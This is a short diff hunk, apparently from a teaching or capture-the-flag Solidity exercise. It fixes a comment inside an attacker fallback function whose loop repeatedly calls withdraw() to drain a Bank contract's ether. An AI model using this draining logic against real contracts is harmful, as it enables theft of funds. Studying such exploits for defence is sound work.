@@ -28,7 +28,7 @@ attacker_fallback() function
         // get the total bank balance of the Bank contract
         uint256 bank_balance = address_bank.balance(); 
         // ether_stolen increments by 10, so, to make sure that the transaction doesn't revert, due to Bank's insuficient balance, 
-(ether_stolen + 10) is set
+        // (ether_stolen + 10) is set
         while((ether_stolen + 10) <= bank_balance) {
             address_bank.withdraw(); 
             ether_stolen += 10; 
